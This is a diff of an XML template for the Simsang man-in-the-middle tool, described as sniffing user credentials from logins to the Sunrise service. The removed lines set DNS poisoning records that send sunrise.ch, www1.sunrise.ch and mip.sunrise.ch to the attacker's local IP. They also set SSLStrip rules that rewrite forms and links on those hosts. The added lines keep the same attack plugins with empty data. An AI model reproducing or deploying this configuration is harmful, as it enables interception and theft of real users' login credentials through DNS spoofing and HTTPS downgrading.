@@ -1,86 +1,37 @@
-<SessionTemplate>
+<SimsangTemplate>
 
-  <Config>
+  <TemplateConfig>
     <Name>Sunrise user login</Name>
     <Description>Sniffing user credentials from login attempt on Sunrise user authentication procedure</Description>
     <Timestamp>2016-02-27</Timestamp>
     <Version>0.2</Version>
     <Author>Simsang</Author>
     <Reference>http://buglist.io/ </Reference>
-  </Config>
+  </TemplateConfig>
 
-  </Hops>
+  <Hops>
     <Hop>
       <Host>GET http://DUMMY</Host>
       <Description>User typed URL in browser</Description>
     </Hop>
-  </Hops>
+  </Hops>  
 
+  <Plugins>
 
+    <Plugin>
+      <Name>DNS Poisoning</Name>
+      <Data></Data>
+    </Plugin>
 
-<Plugins>
+    <Plugin>
+      <Name>HTTP accounts</Name>
+      <Data></Data>
+    </Plugin>
 
-<Plugin name="DNS Poisoning" dirname="DNSPoisoning">
+    <Plugin>
+      <Name>SSLStrip</Name>
+      <Data></Data>
+    </Plugin>
 
-<ArrayOfDNSPoisonRecord xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
-  <DNSPoisonRecord>
-    <HostName>www1.sunrise.ch</HostName>
-    <IPAddress>@LOCALIP</IPAddress>
-  </DNSPoisonRecord>
-  <DNSPoisonRecord>
-    <HostName>sunrise.ch</HostName>
-    <IPAddress>@LOCALIP</IPAddress>
-  </DNSPoisonRecord>
-  <DNSPoisonRecord>
-    <HostName>mip.sunrise.ch</HostName>
-    <IPAddress>@LOCALIP</IPAddress>
-  </DNSPoisonRecord>
-</ArrayOfDNSPoisonRecord>
-</Plugin>
-
-<Plugin name="HTTP accounts" dirname="HTTPAccounts">
-
-<PluginData xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
-  <Records />
-</PluginData>
-</Plugin>
-
-<Plugin name="SSLStrip" dirname="SSLStrip">
-
-<ArrayOfSSLStripRecord xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
-  <SSLStripRecord>
-    <HostName>sunrise.ch</HostName>
-    <ContentType>text/html</ContentType>
-    <Tag>form</Tag>
-  </SSLStripRecord>
-  <SSLStripRecord>
-    <HostName>sunrise.ch</HostName>
-    <ContentType>text/html</ContentType>
-    <Tag>a</Tag>
-  </SSLStripRecord>
-  <SSLStripRecord>
-    <HostName>www1.sunrise.ch</HostName>
-    <ContentType>text/html</ContentType>
-    <Tag>form</Tag>
-  </SSLStripRecord>
-  <SSLStripRecord>
-    <HostName>www1.sunrise.ch</HostName>
-    <ContentType>text/html</ContentType>
-    <Tag>a</Tag>
-  </SSLStripRecord>
-  <SSLStripRecord>
-    <HostName>mip.sunrise.ch</HostName>
-    <ContentType>text/html</ContentType>
-    <Tag>a</Tag>
-  </SSLStripRecord>
-  <SSLStripRecord>
-    <HostName>mip.sunrise.ch</HostName>
-    <ContentType>text/html</ContentType>
-    <Tag>form</Tag>
-  </SSLStripRecord>
-</ArrayOfSSLStripRecord>
-</Plugin>
-
-
-</Plugins>
-</SessionTemplate>
+  </Plugins>
+</SimsangTemplate>
